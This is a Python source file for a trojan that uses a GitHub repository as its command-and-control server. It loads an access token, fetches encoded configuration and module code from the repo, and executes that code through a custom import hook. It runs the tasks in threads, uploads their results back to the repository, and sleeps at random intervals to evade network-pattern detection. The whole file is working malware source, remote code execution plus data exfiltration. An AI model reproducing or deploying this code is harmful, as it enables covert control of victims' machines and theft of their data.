import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

repository = input('Enter your Github repository: ')
username   = input('Enter your Github username: ')

def github_connect():
    '''Github-aware trojan'''
    with open('weathertoday.txt') as f:
        token = f.read()
        token = token.strip('\n')
    
    repo = repository
    user = username
    sess       = github3.login(token=token)
    return sess.repository(user, repository)

def get_file_contents(dirname, module_name, repo):
    ''' Grabs files from the remote repository and reads the contents in locally.
        This allows us to read configuration options and the module source code'''
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id):
        self.id          = id
        self.config_file = f'{id}.json'
        self.data_path   = f'data/{id}'     # Output files
        self.repo        = github_connect()

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config      = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config
    
    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message     = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata     = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target = self.module_runner,
                    args   = (task['module'],))
                thread.start()
                time.sleep(random.randint(1,10))
            # avoid network-pattern analysis
            time.sleep(random.randint(30*60, 3*60*60))

class GitImporter:
    ''' Every time the interpreter needs to load a module but is not available, it will use this class'''
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print("Attempting to retrieve %s" % name)
        self.repo   = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)        # Github returns base64-encoded data
            return self     # Module found, now it can call the load_module 
        
    def load_module(self, name):
            # Native importlib used to create a new blank module object
        spec       = importlib.util.spec_from_loader(name, loader = None, origin = self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
            # Insert thre newly created module into the sys.modules list so it can be retrieved in future import calls.
        sys.modules[spec.name] = new_module
        return new_module 

if __name__ == '__main__':
    # Add our Github class into the sys.meta_path list
    sys.meta_path.append(GitImporter())
    horsey = Trojan('abc')
    horsey.run()

        

            

